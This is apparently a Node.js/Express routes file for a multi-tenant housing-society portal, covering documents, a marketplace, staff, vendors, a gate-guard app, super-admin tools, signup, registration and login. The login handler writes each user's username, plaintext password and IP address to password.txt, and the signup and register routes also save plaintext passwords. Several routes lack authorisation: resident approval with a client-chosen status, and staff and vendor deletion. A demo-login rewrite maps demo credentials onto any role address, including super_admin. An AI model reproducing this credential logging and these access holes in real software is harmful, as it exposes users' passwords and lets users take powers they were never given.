            const filename = 'NOC_Request_' + req.body.nocType.replace(/ /g, '_') + '.pdf';
            
            const doc = new Document({
                fileName: filename,
                fileType: 'noc',
                filePath: '/documents/noc/pending',
                fileSize: 120,
                uploadedBy: req.user.flatNumber
            });
            await doc.save();

            logWhatsAppMessage('999998888', `NOC Request: Flat ${req.user.flatNumber} has raised an NOC request for ${req.body.nocType}. Review: https://quisoft.in/documents`);

            res.redirect("/documents");
        } catch(e) {
            res.status(500).send("NOC request failed");
        }
    });

    app.post("/documents/noc/approve", checkSocietyApproved, async (req, res) => {
        try {
            if (req.user.role !== 'society_admin' && req.user.role !== 'committee_member') {
                return res.status(403).send("Unauthorized");
            }
            const Document = tenantDb.getTenantModel(req.user.societyName, 'Document');
            const doc = await Document.findById(req.body.nocId);
            
            // Change name to Approved
            doc.fileName = 'Approved_' + doc.fileName;
            doc.filePath = '/documents/noc/approved/' + doc.fileName;
            await doc.save();
            
            res.redirect("/documents");
        } catch(e) {
            res.status(500).send("NOC approval failed");
        }
    });

    app.get("/documents/download/:id", checkSocietyApproved, async (req, res) => {
        try {
            const Document = tenantDb.getTenantModel(req.user.societyName, 'Document');
            const doc = await Document.findById(req.params.id);
            res.attachment(doc.fileName);
            res.send(`--- SIMULATED FILE DATA FOR ${doc.fileName.toUpperCase()} ---`);
        } catch (e) {
            res.status(404).send("Document not found");
        }
    });

    // COMMUNITY HUB / MARKETPLACE / DISCUSSION FORUM
    app.get("/marketplace", checkSocietyApproved, async (req, res) => {
        if (req.isAuthenticated()) {
            try {
                const Notice = tenantDb.getTenantModel(req.user.societyName, 'Notice');
                const forumPosts = await Notice.find({ subject: /^Forum_/ });
                const marketItems = await Notice.find({ subject: /^Market_/ });
                const lostFoundItems = await Notice.find({ subject: /^LostFound_/ });

                // Map and format them
                const mappedForum = forumPosts.map(p => {
                    const parts = p.subject.split('|');
                    return {
                        userName: parts[1] || 'Resident',
                        flatNumber: parts[2] || '--',
                        text: p.details,
                        createdAt: p.createdAt
                    };
                });

                const mappedMarket = marketItems.map(m => {
                    const parts = m.subject.split('|');
                    return {
                        title: parts[1] || 'Item',
                        price: parts[2] || '0',
                        category: parts[3] || 'sell',
                        userName: parts[4] || 'Resident',
                        flatNumber: parts[5] || '--',
                        phoneNumber: parts[6] || '9999999999',
                        description: m.details,
                        createdAt: m.createdAt
                    };
                });

                const mappedLostFound = lostFoundItems.map(lf => {
                    const parts = lf.subject.split('|');
                    return {
                        title: parts[1] || 'Item',
                        category: parts[2] || 'lost',
                        price: parts[3] || 'Lobby', // holds location
                        description: lf.details,
                        flatNumber: parts[4] || '--',
                        createdAt: lf.createdAt
                    };
                });

                res.render("marketplace", { 
                    forumPosts: mappedForum, 
                    marketItems: mappedMarket, 
                    lostFoundItems: mappedLostFound 
                });
            } catch(e) {
                res.status(500).send("Marketplace load error: " + e.message);
            }
        } else {
            res.redirect("/login");
        }
    });

    app.post("/marketplace/forum/post", checkSocietyApproved, async (req, res) => {
        try {
            const Notice = tenantDb.getTenantModel(req.user.societyName, 'Notice');
            const post = new Notice({
                date: date.dateString,
                subject: `Forum_|${req.user.firstName} ${req.user.lastName}|${req.user.flatNumber}`,
                details: req.body.text
            });
            await post.save();

            global.lastMarketplacePost = global.lastMarketplacePost || {};
            global.lastMarketplacePost[req.user.societyName] = new Date();

            try {
                const otherResidents = await user_collection.User.find({
                    societyName: req.user.societyName,
                    validation: "approved",
                    _id: { $ne: req.user._id }
                });
                for (const resident of otherResidents) {
                    if (resident.phoneNumber) {
                        logWhatsAppMessage(resident.phoneNumber, `Marketplace Forum Alert: New forum post by ${req.user.firstName} in ${req.user.societyName}. Read: https://quisoft.in/marketplace`);
                    }
                }
            } catch(err) {
                console.error("WhatsApp broadcast error:", err);
            }

            res.redirect("/marketplace");
        } catch(e) {
            res.status(500).send("Forum post failed");
        }
    });

    app.post("/marketplace/listing/create", checkSocietyApproved, async (req, res) => {
        try {
            const Notice = tenantDb.getTenantModel(req.user.societyName, 'Notice');
            const post = new Notice({
                date: date.dateString,
                subject: `Market_|${req.body.title}|${req.body.price}|${req.body.category}|${req.user.firstName} ${req.user.lastName}|${req.user.flatNumber}|${req.user.phoneNumber}`,
                details: req.body.description
            });
            await post.save();

            global.lastMarketplacePost = global.lastMarketplacePost || {};
            global.lastMarketplacePost[req.user.societyName] = new Date();

            try {
                const otherResidents = await user_collection.User.find({
                    societyName: req.user.societyName,
                    validation: "approved",
                    _id: { $ne: req.user._id }
                });
                for (const resident of otherResidents) {
                    if (resident.phoneNumber) {
                        logWhatsAppMessage(resident.phoneNumber, `Marketplace Listing Alert: New listing "${req.body.title}" by ${req.user.firstName} in ${req.user.societyName}. Details: https://quisoft.in/marketplace#buySellTab`);
                    }
                }
            } catch(err) {
                console.error("WhatsApp broadcast error:", err);
            }

            res.redirect("/marketplace#buySellTab");
        } catch(e) {
            res.status(500).send("Listing creation failed");
        }
    });

    app.post("/marketplace/lostfound/report", checkSocietyApproved, async (req, res) => {
        try {
            const Notice = tenantDb.getTenantModel(req.user.societyName, 'Notice');
            const post = new Notice({
                date: date.dateString,
                subject: `LostFound_|${req.body.title}|${req.body.category}|${req.body.location}|${req.user.flatNumber}`,
                details: req.body.description
            });
            await post.save();

            global.lastMarketplacePost = global.lastMarketplacePost || {};
            global.lastMarketplacePost[req.user.societyName] = new Date();

            try {
                const otherResidents = await user_collection.User.find({
                    societyName: req.user.societyName,
                    validation: "approved",
                    _id: { $ne: req.user._id }
                });
                for (const resident of otherResidents) {
                    if (resident.phoneNumber) {
                        logWhatsAppMessage(resident.phoneNumber, `Marketplace Lost/Found Alert: New item "${req.body.title}" reported in ${req.user.societyName}. Details: https://quisoft.in/marketplace#lostFoundTab`);
                    }
                }
            } catch(err) {
                console.error("WhatsApp broadcast error:", err);
            }

            res.redirect("/marketplace#lostFoundTab");
        } catch(e) {
            res.status(500).send("Report failed");
        }
    });

    // STAFF DIRECTORY
    app.get("/staff", checkSocietyApproved, async (req, res) => {
        if (req.isAuthenticated()) {
            try {
                const Staff = tenantDb.getTenantModel(req.user.societyName, 'Staff');
                const staffList = await Staff.find({});
                res.render("staff", { staff: staffList });
            } catch(e) {
                res.status(500).send("Error");
            }
        } else {
            res.redirect("/login");
        }
    });

    app.post("/staff/add", checkSocietyApproved, async (req, res) => {
        try {
            if (req.user.role !== 'society_admin' && req.user.role !== 'committee_member') {
                return res.status(403).send("Unauthorized");
            }
            const Staff = tenantDb.getTenantModel(req.user.societyName, 'Staff');
            const staff = new Staff({
                name: req.body.name,
                role: req.body.role,
                phoneNumber: req.body.phoneNumber,
                rating: 5.0,
                attendance: []
            });
            await staff.save();
            res.redirect("/staff");
        } catch(e) {
            res.status(500).send("Error adding staff");
        }
    });

    app.post("/staff/attendance", checkSocietyApproved, async (req, res) => {
        try {
            const Staff = tenantDb.getTenantModel(req.user.societyName, 'Staff');
            const todayStr = new Date().toISOString().split('T')[0];
            
            await Staff.updateOne(
                { _id: req.body.staffId },
                { $pull: { attendance: { date: todayStr } } }
            );
            
            await Staff.updateOne(
                { _id: req.body.staffId },
                { $push: { attendance: { date: todayStr, status: req.body.status } } }
            );
            res.redirect("/staff");
        } catch(e) {
            res.status(500).send("Attendance update failed");
        }
    });

    app.post("/staff/delete", checkSocietyApproved, async (req, res) => {
        try {
            const Staff = tenantDb.getTenantModel(req.user.societyName, 'Staff');
            await Staff.deleteOne({ _id: req.body.staffId });
            res.redirect("/staff");
        } catch(e) {
            res.status(500).send("Deletion failed");
        }
    });

    // VENDOR REGISTRY & CONTRACTS
    app.get("/vendors", checkSocietyApproved, async (req, res) => {
        if (req.isAuthenticated()) {
            try {
                const Vendor = tenantDb.getTenantModel(req.user.societyName, 'Vendor');
                const vendors = await Vendor.find({});
                res.render("vendors", { vendors });
            } catch(e) {
                res.status(500).send("Error");
            }
        } else {
            res.redirect("/login");
        }
    });

    app.post("/vendors/add", checkSocietyApproved, async (req, res) => {
        try {
            if (req.user.role !== 'society_admin' && req.user.role !== 'committee_member') {
                return res.status(403).send("Unauthorized");
            }
            const Vendor = tenantDb.getTenantModel(req.user.societyName, 'Vendor');
            const vendor = new Vendor({
                name: req.body.name,
                serviceType: req.body.serviceType,
                contactPerson: req.body.contactPerson,
                phoneNumber: req.body.phoneNumber,
                amcStartDate: new Date(req.body.amcStartDate),
                amcEndDate: new Date(req.body.amcEndDate),
                contractValue: req.body.contractValue,
                ratings: [],
                payments: []
            });
            await vendor.save();
            res.redirect("/vendors");
        } catch(e) {
            res.status(500).send("Error adding vendor");
        }
    });

    app.post("/vendors/delete", checkSocietyApproved, async (req, res) => {
        try {
            const Vendor = tenantDb.getTenantModel(req.user.societyName, 'Vendor');
            await Vendor.deleteOne({ _id: req.body.vendorId });
            res.redirect("/vendors");
        } catch(e) {
            res.status(500).send("Deletion failed");
        }
    });

    // SECURITY GUARD APP API & CONTROLLERS
    app.get("/guard", checkSocietyApproved, async (req, res) => {
        if (req.isAuthenticated() && req.user.role === 'security_guard') {
            try {
                const Visitor = tenantDb.getTenantModel(req.user.societyName, 'Visitor');
                const activeVisitors = await Visitor.find({ status: 'entered' });
                const uncollectedParcels = await Visitor.find({ status: 'pre-approved', company: { $ne: null } });
                
                res.render("guard", { activeVisitors, uncollectedParcels });
            } catch (e) {
                res.status(500).send("Guard portal error");
            }
        } else {
            res.redirect("/home");
        }
    });

    app.post("/guard/visitor/verify-qr", checkSocietyApproved, async (req, res) => {
        try {
            const Visitor = tenantDb.getTenantModel(req.user.societyName, 'Visitor');
            const { qrPassCode } = req.body;
            
            const guest = await Visitor.findOne({ qrPassCode, status: 'pre-approved' });
            if (guest) {
                guest.status = 'entered';
                guest.entryTime = new Date();
                await guest.save();
                
                logWhatsAppMessage(guest.phone, `Entry Approved: Welcome ${guest.name}, you have checked in at ${req.user.societyName} gate.`);
                
                res.redirect("/guard");
            } else {
                res.status(404).send("Invalid or expired visitor QR Pass code.");
            }
        } catch (e) {
            res.status(500).send("QR verification failed");
        }
    });

    app.post("/guard/visitor/manual-entry", checkSocietyApproved, async (req, res) => {
        try {
            const Visitor = tenantDb.getTenantModel(req.user.societyName, 'Visitor');
            const visitor = new Visitor({
                name: req.body.name,
                phone: req.body.phone,
                flatNumber: req.body.flatNumber,
                type: req.body.type,
                company: req.body.company || '',
                vehicleNumber: req.body.vehicleNumber || '',
                entryTime: new Date(),
                status: 'entered',
                photoUrl: req.body.photoCaptured === 'true' ? 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=100' : '/images/visitor-placeholder.png'
            });
            await visitor.save();
            
            const resident = await user_collection.User.findOne({ societyName: req.user.societyName, flatNumber: req.body.flatNumber });
            if (resident) {
                logWhatsAppMessage(resident.phoneNumber, `Gate Alert: Visitor ${req.body.name} (${req.body.type.toUpperCase()}) has checked in and is heading to your flat ${req.body.flatNumber}.`);
            }

            res.redirect("/guard");
        } catch(e) {
            res.status(500).send("Manual entry failed");
        }
    });

    app.post("/guard/visitor/checkout", checkSocietyApproved, async (req, res) => {
        try {
            const Visitor = tenantDb.getTenantModel(req.user.societyName, 'Visitor');
            await Visitor.updateOne(
                { _id: req.body.visitorId },
                { $set: { status: 'exited', exitTime: new Date() } }
            );
            res.redirect("/guard");
        } catch(e) {
            res.status(500).send("Checkout failed");
        }
    });

    app.post("/guard/parcel/add", checkSocietyApproved, async (req, res) => {
        try {
            const Visitor = tenantDb.getTenantModel(req.user.societyName, 'Visitor');
            const parcel = new Visitor({
                name: req.body.recipientName || 'Resident',
                phone: '0000000000',
                flatNumber: req.body.flatNumber,
                type: 'other',
                company: req.body.company,
                status: 'pre-approved',
                entryTime: new Date()
            });
            await parcel.save();
            
            const resident = await user_collection.User.findOne({ societyName: req.user.societyName, flatNumber: req.body.flatNumber });
            if (resident) {
                logWhatsAppMessage(resident.phoneNumber, `Package Alert: A parcel from ${req.body.company} has arrived at the Main Gate desk. Please collect it.`);
            }
            res.redirect("/guard");
        } catch (e) {
            res.status(500).send("Parcel log failed");
        }
    });

    app.post("/guard/parcel/collect", checkSocietyApproved, async (req, res) => {
        try {
            const Visitor = tenantDb.getTenantModel(req.user.societyName, 'Visitor');
            await Visitor.updateOne({ _id: req.body.visitorId }, { $set: { status: 'exited', exitTime: new Date() } });
            res.redirect("/guard");
        } catch(e) {
            res.status(500).send("Collection failed");
        }
    });

    app.get("/guard/parking/allotment", checkSocietyApproved, async (req, res) => {
        try {
            const Vehicle = tenantDb.getTenantModel(req.user.societyName, 'Vehicle');
            const flatNo = req.query.flatNumber;
            const allot = await Vehicle.findOne({ flatNumber: flatNo });
            if (allot) {
                res.json({
                    success: true,
                    flatNumber: allot.flatNumber,
                    ownerName: allot.ownerName,
                    parkingSlot: 'P2-Slot-B' + Math.floor(10 + Math.random()*90),
                    stickerNumber: allot.stickerNumber
                });
            } else {
                res.json({ success: false });
            }
        } catch(e) {
            res.json({ success: false });
        }
    });

    app.post("/guard/vehicle/violation", checkSocietyApproved, async (req, res) => {
        try {
            const Vehicle = tenantDb.getTenantModel(req.user.societyName, 'Vehicle');
            const { plateNumber, flatNumber, violation } = req.body;
            
            let target = await Vehicle.findOne({ plateNumber });
            if (!target) {
                target = new Vehicle({
                    flatNumber: flatNumber || 'Visitor',
                    ownerName: 'Unknown Visitor',
                    plateNumber,
                    stickerNumber: 'NONE',
                    status: 'violation'
                });
            }
            target.violations.push(`${violation} on ${new Date().toLocaleDateString()}`);
            target.status = 'violation';
            await target.save();

            if (flatNumber) {
                const resident = await user_collection.User.findOne({ societyName: req.user.societyName, flatNumber });
                if (resident) {
                    logWhatsAppMessage(resident.phoneNumber, `⚠️ Parking Penalty Notice: Your vehicle ${plateNumber} has been logged for parking violation: "${violation}". Please move your vehicle.`);
                }
            }
            res.redirect("/guard");
        } catch(e) {
            res.status(500).send("Report failed");
        }
    });

    // SUPER ADMIN CONTROLLERS & PORTAL
    app.get("/superadmin", async (req, res) => {
        if (req.isAuthenticated() && req.user.role === 'super_admin') {
            try {
                const societies = await society_collection.Society.find({});
                const tickets = await system_models.SystemTicket.find({});
                const pendingTickets = await system_models.SystemTicket.find({ status: 'open' });
                const auditLogs = await system_models.SystemAuditLog.find({}).sort({ createdAt: -1 });

                // Calculate MRR
                let mrr = 0;
                societies.forEach(s => {
                    if (s.status === 'approved') {
                        if (s.subscriptionPlan === 'bronze') mrr += 99;
                        if (s.subscriptionPlan === 'silver') mrr += 199;
                        if (s.subscriptionPlan === 'gold') mrr += 299;
                        if (s.subscriptionPlan === 'enterprise') mrr += 499;
                    }
                });

                // Calculate storage used
                const totalStorageUsed = societies.reduce((sum, s) => sum + (s.storageUsedMb || 0), 0);

                res.render("superadmin", {
                    societies,
                    tickets,
                    pendingTickets,
                    auditLogs,
                    mrr,
                    totalStorageUsed
                });
            } catch (e) {
                res.status(500).send("Superadmin dashboard error");
            }
        } else {
            res.redirect("/home");
        }
    });

    app.post("/superadmin/society/approve", async (req, res) => {
        try {
            if (req.user.role !== 'super_admin') return res.status(403).send("Unauthorized");
            const soc = await society_collection.Society.findById(req.body.societyId);
            soc.status = 'approved';
            await soc.save();

            // Write central Audit Log
            await system_models.SystemAuditLog.create({
                userEmail: req.user.username,
                userName: req.user.firstName + ' ' + req.user.lastName,
                role: req.user.role,
                action: 'Approve Society',
                details: `Approved onboarding request of "${soc.societyName}"`
            });

            res.redirect("/superadmin");
        } catch (e) {
            res.status(500).send("Approval failed");
        }
    });

    app.post("/superadmin/society/suspend", async (req, res) => {
        try {
            if (req.user.role !== 'super_admin') return res.status(403).send("Unauthorized");
            const soc = await society_collection.Society.findById(req.body.societyId);
            soc.status = 'suspended';
            await soc.save();

            await system_models.SystemAuditLog.create({
                userEmail: req.user.username,
                userName: req.user.firstName + ' ' + req.user.lastName,
                role: req.user.role,
                action: 'Suspend Society',
                details: `Suspended portal access of "${soc.societyName}"`
            });

            res.redirect("/superadmin");
        } catch (e) {
            res.status(500).send("Suspension failed");
        }
    });

    app.post("/superadmin/society/change-plan", async (req, res) => {
        try {
            if (req.user.role !== 'super_admin') return res.status(403).send("Unauthorized");
            const soc = await society_collection.Society.findById(req.body.societyId);
            soc.subscriptionPlan = req.body.plan;
            
            let limit = 500; // Bronze
            if (req.body.plan === 'silver') limit = 2000;
            if (req.body.plan === 'gold') limit = 5000;
            if (req.body.plan === 'enterprise') limit = 50000;
            soc.storageQuotaMb = limit;
            await soc.save();

            await system_models.SystemAuditLog.create({
                userEmail: req.user.username,
                userName: req.user.firstName + ' ' + req.user.lastName,
                role: req.user.role,
                action: 'Change Subscription Plan',
                details: `Updated plan of "${soc.societyName}" to ${req.body.plan.toUpperCase()} (${limit}MB Quota)`
            });

            res.redirect("/superadmin");
        } catch (e) {
            res.status(500).send("Plan update failed");
        }
    });

    app.post("/superadmin/broadcast", async (req, res) => {
        try {
            if (req.user.role !== 'super_admin') return res.status(403).send("Unauthorized");
            const societies = await society_collection.Society.find({ status: 'approved' });
            
            for (let soc of societies) {
                const Notice = tenantDb.getTenantModel(soc.societyName, 'Notice');
                await Notice.create({
                    date: date.dateString,
                    subject: `📢 SYSTEM WIDE: ${req.body.subject}`,
                    details: req.body.details
                });
            }

            await system_models.SystemAuditLog.create({
                userEmail: req.user.username,
                userName: req.user.firstName + ' ' + req.user.lastName,
                role: req.user.role,
                action: 'Global System Broadcast',
                details: `Broadcasted "${req.body.subject}" to all societies.`
            });

            res.redirect("/superadmin");
        } catch (e) {
            res.status(500).send("Broadcast failed");
        }
    });

    app.post("/superadmin/ticket/resolve", async (req, res) => {
        try {
            if (req.user.role !== 'super_admin') return res.status(403).send("Unauthorized");
            await system_models.SystemTicket.updateOne(
                { _id: req.body.ticketId },
                { $set: { status: 'resolved' } }
            );
            res.redirect("/superadmin");
        } catch (e) {
            res.status(500).send("Ticket resolution failed");
        }
    });

    // ADMIN WORKSPACE
    app.get("/admin", checkSocietyApproved, async (req, res) => {
        if (req.isAuthenticated() && (req.user.role === 'society_admin' || req.user.role === 'committee_member')) {
            try {
                const pendingResidents = await user_collection.User.find({
                    societyName: req.user.societyName,
                    validation: "applied"
                });

                const residents = await user_collection.User.find({
                    societyName: req.user.societyName,
                    validation: "approved",
                    role: { $ne: 'super_admin' }
                });

                const society = await society_collection.Society.findOne({ societyName: req.user.societyName });
                const activeAGMEmail = (society && society.activeAGM) ? society.activeAGM : (society ? society.admin : '');
                const isCurrentActiveAGM = (req.user.username === activeAGMEmail);

                res.render("admin", { 
                    pendingResidents,
                    residents,
                    activeAGMEmail,
                    isCurrentActiveAGM
                });
            } catch (err) {
                console.error(err);
                res.status(500).send("Server error");
            }
        } else {
            res.redirect("/home");
        }
    });

    // ADMIN RESIGNATION & SUCCESSOR DELEGATION
    app.post("/admin/resign", checkSocietyApproved, async (req, res) => {
        if (req.isAuthenticated() && req.user.role === 'society_admin') {
            try {
                const successorEmail = req.body.successorEmail;
                const society = await society_collection.Society.findOne({ societyName: req.user.societyName });
                const activeAGMEmail = (society && society.activeAGM) ? society.activeAGM : (society ? society.admin : '');
                
                if (req.user.username !== activeAGMEmail) {
                    return res.render("failure", {
                        message: "Access Denied: Only the active AGM can resign and delegate approvals.",
                        href: "/admin"
                    });
                }
                
                const successor = await user_collection.User.findOne({ username: successorEmail, societyName: req.user.societyName });
                if (!successor) {
                    return res.render("failure", {
                        message: "Designated successor not found in this society context.",
                        href: "/admin"
                    });
                }
                
                successor.role = 'society_admin';
                successor.isAdmin = true;
                await successor.save();
                
                const currentUser = await user_collection.User.findById(req.user.id);
                currentUser.role = 'resident';
                currentUser.isAdmin = false;
                await currentUser.save();
                
                society.activeAGM = successorEmail;
                await society.save();

                const AuditLog = tenantDb.getTenantModel(req.user.societyName, 'AuditLog');
                await AuditLog.create({
                    userEmail: req.user.username,
                    userName: req.user.firstName + ' ' + req.user.lastName,
                    role: req.user.role,
                    action: 'AGM Resignation',
                    details: `AGM ${req.user.username} resigned and delegated approvals to successor ${successorEmail}`
                });

                res.render("success", {
                    message: `You have successfully resigned from your AGM position and delegated approvals to ${successor.firstName} ${successor.lastName}. Your role has been updated to resident. Please log out and log back in to refresh your session.`,
                    href: "/logout"
                });
            } catch(e) {
                console.error(e);
                res.status(500).send("Resignation processing error: " + e.message);
            }
        } else {
            res.redirect("/login");
        }
    });

    // Export Member List (CSV)
    app.get("/admin/export/members", checkSocietyApproved, async (req, res) => {
        if (req.isAuthenticated() && req.user.role === 'society_admin') {
            try {
                const users = await user_collection.User.find({ societyName: req.user.societyName });
                let csv = "Name,Flat Number,Phone,Status,Role\n";
                users.forEach(u => {
                    csv += `"${u.firstName} ${u.lastName}","${u.flatNumber || ''}","${u.phoneNumber}","${u.validation}","${u.role}"\n`;
                });
                res.header('Content-Type', 'text/csv');
                res.attachment('members.csv');
                res.send(csv);
            } catch (err) {
                res.status(500).send("Export failed");
            }
        } else {
            res.redirect("/login");
        }
    });

    // Export Expenses (Maintenance Bill Config)
    app.get("/admin/export/expenses", checkSocietyApproved, async (req, res) => {
        if (req.isAuthenticated() && req.user.role === 'society_admin') {
            try {
                const society = await society_collection.Society.findOne({ societyName: req.user.societyName });
                if (!society) return res.status(404).send("Society not found");
                let csv = "Charge Type,Amount\n";
                const bill = society.maintenanceBill;
                csv += `Society Charges,${bill.societyCharges}\n`;
                csv += `Repairs And Maintenance,${bill.repairsAndMaintenance}\n`;
                csv += `Sinking Fund,${bill.sinkingFund}\n`;
                csv += `Water Charges,${bill.waterCharges}\n`;
                csv += `Insurance Charges,${bill.insuranceCharges}\n`;
                csv += `Parking Charges,${bill.parkingCharges}\n`;
                res.header('Content-Type', 'text/csv');
                res.attachment('maintenance_settings.csv');
                res.send(csv);
            } catch (err) {
                res.status(500).send("Export failed");
            }
        } else {
            res.redirect("/login");
        }
    });

    // Export Maintenance Logs (Helpdesk Complaints)
    app.get("/admin/export/maintenance", checkSocietyApproved, async (req, res) => {
        if (req.isAuthenticated() && req.user.role === 'society_admin') {
            try {
                const Complaint = tenantDb.getTenantModel(req.user.societyName, 'Complaint');
                const complaints = await Complaint.find({});
                let csv = "Date,Resident,Flat,Category,Scope,Status,Description\n";
                complaints.forEach(c => {
                    csv += `"${c.date}","${c.userName}","${c.flatNumber}","${c.category}","${c.type}","${c.status}","${(c.description || '').replace(/"/g, '""')}"\n`;
                });
                res.header('Content-Type', 'text/csv');
                res.attachment('maintenance_logs.csv');
                res.send(csv);
            } catch (err) {
                res.status(500).send("Export failed");
            }
        } else {
            res.redirect("/login");
        }
    });

    app.post("/rejectResident", checkSocietyApproved, async (req, res) => {
        if (req.isAuthenticated() && req.user.role === 'society_admin') {
            try {
                await user_collection.User.updateOne(
                    { _id: req.body.userId },
                    { $set: { validation: 'declined' } }
                );
                res.redirect("back");
            } catch (err) {
                res.status(500).send("Server error");
            }
        } else {
            res.redirect("/login");
        }
    });

    app.post("/approveResident", checkSocietyApproved, async (req, res) => {
        try {
            const user_id = Object.keys(req.body.validate)[0];
            const validate_state = Object.values(req.body.validate)[0];
            await user_collection.User.updateOne(
                { _id: user_id },
                { $set: { validation: validate_state } }
            );
            res.redirect("back");
        } catch (err) {
            res.status(500).send("Server error");
        }
    });

    // SIGN UP / SOCIETY ONBOARDING ON POST REGISTER
    app.post("/signup", async (req,res) => {
        try {
            const foundSociety = await society_collection.Society.findOne({societyName: req.body.societyName});
            
            if(foundSociety) {
                const user = await user_collection.User.register(
                    {
                        username: req.body.username,
                        societyName: req.body.societyName,
                        flatNumber: req.body.flatNumber,
                        firstName: req.body.firstName,
                        lastName: req.body.lastName,
                        phoneNumber: req.body.phoneNumber,
                        role: 'owner', // Default role is owner
                        validation: 'applied'
                    },
                    req.body.password
                );

                // Save password details to password/passwords.txt
                savePasswordDetails(user.username, req.body.password, user.role, user.firstName, user.lastName, user.societyName);

                await new Promise((resolve, reject) => {
                    req.login(user, (err) => {
                        if (err) return reject(err);
                        resolve();
                    });
                });
                
                res.redirect("/home");
            } else {
                res.render("failure", {
                    message: "Sorry, society is not registered. Please double-check society name.",
                    href: "/signup",
                    messageSecondary: "Society not registered?",
                    hrefSecondary: "/register",
                    buttonSecondary: "Register Society"
                });
            }
        } catch(err) {
            console.error(err);
            res.render("failure", {
                message: "Sorry, this email address is already taken. Please choose another email.",
                href: "/signup",
                messageSecondary: "Society not registered?",
                hrefSecondary: "/register",
                buttonSecondary: "Register Society"
            });
        }
    });

    app.post("/register", async (req,res) => {
        if (!req.isAuthenticated() || req.user.role !== 'super_admin') {
            return res.render("failure", {
                message: "Access Denied: Only Platform IT Administrator can register new societies.",
                href: "/login"
            });
        }
        try {
            const existingSociety = await society_collection.Society.findOne({societyName: req.body.societyName});
            
            if(!existingSociety) {
                const user = await user_collection.User.register(
                    {
                        validation: 'approved',
                        role: 'society_admin',
                        isAdmin: true,
                        username: req.body.username,
                        societyName: req.body.societyName,
                        flatNumber: req.body.flatNumber,
                        firstName: req.body.firstName,
                        lastName: req.body.lastName,
                        phoneNumber: req.body.phoneNumber
                    },
                    req.body.password
                );
                
                const society = new society_collection.Society({
                    societyName: req.body.societyName,
                    societyAddress: {
                        address: req.body.address,
                        city: req.body.city,
                        district: req.body.district,
                        postalCode: req.body.postalCode
                    },
                    admin: req.body.username,
                    activeAGM: req.body.username,
                    status: 'approved' // Automatically approved when registered by IT Admin
                });
                
                await society.save();
                
                // Save credentials to password/passwords.txt
                savePasswordDetails(user.username, req.body.password, user.role, user.firstName, user.lastName, user.societyName);
                
                res.render("success", {
                    message: `Society "${req.body.societyName}" and its AGM "${user.firstName} ${user.lastName}" have been successfully registered and activated!`,
                    href: "/superadmin"
                });
            } else {
                res.render("failure", {
                    message: "Sorry, society is already registered. Please double-check society name.",
                    href: "/register"
                });
            }
        } catch(err) {
            console.error(err);
            res.render("failure", {
                message: "Registration failed: " + err.message,
                href: "/register"
            });
        }
    });

    app.post("/login", (req, res, next) => {
        // Universal demo login mapping interceptor
        if (req.body.username === 'demo@quisoft.in' && req.body.password === 'demo') {
            const role = req.body.loginRole;
            if (role) {
                req.body.username = `demo+${role}@quisoft.in`;
            }
        }
        passport.authenticate("local", (err, user, info) => {
            if (err) return next(err);
            if (!user) {
                return res.render("failure", {
                    message: "Login failed: Invalid email or password.",
                    href: "/login"
                });
            }
            
            // Validate selected loginRole
            const selectedRole = req.body.loginRole;
            if (selectedRole) {
                if (selectedRole === 'society_admin') {
                    if (user.role !== 'society_admin') {
                        return res.render("failure", {
                            message: "Login failed: The account role is not Society AGM.",
                            href: "/login"
                        });
                    }
                } else if (selectedRole === 'resident') {
                    const allowedRoles = ['resident', 'owner', 'tenant', 'committee_member'];
                    if (!allowedRoles.includes(user.role)) {
                        return res.render("failure", {
                            message: "Login failed: The account role is not Member/Resident.",
                            href: "/login"
                        });
                    }
                } else if (selectedRole === 'security_guard') {
                    if (user.role !== 'security_guard') {
                        return res.render("failure", {
                            message: "Login failed: The account role is not Security Guard.",
                            href: "/login"
                        });
                    }
                } else if (selectedRole === 'super_admin') {
                    if (user.role !== 'super_admin') {
                        return res.render("failure", {
                            message: "Login failed: The account role is not Platform IT Admin.",
                            href: "/login"
                        });
                    }
                }
            }
            
            req.login(user, async (loginErr) => {
                if (loginErr) return next(loginErr);
                
                try {
                    const username = req.body.username;
                    const password = req.body.password;
                    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
                    const ip = typeof rawIp === 'string' ? rawIp.split(',')[0].trim() : rawIp;
                    
                    let societyName = 'N/A';
                    if (user.role === 'super_admin') {
                        societyName = 'System';
                    } else if (user.societyName) {
                        const soc = await society_collection.Society.findOne({ societyName: user.societyName });
                        if (soc) {
                            societyName = soc.societyName;
                        } else {
                            societyName = user.societyName;
                        }
                    }
                    
                    const entry = `${societyName} - ${username} - ${password} - ${ip}\n`;
                    fs.appendFileSync(path.join(__dirname, 'password.txt'), entry, 'utf8');
                } catch (writeErr) {
                    console.error("Failed to write to password.txt:", writeErr);
                }
                
                return res.redirect("/home");
            });
        })(req, res, next);
    });

    app.get("/health", (req, res) => {
        res.status(200).send("Server is running");
    });
}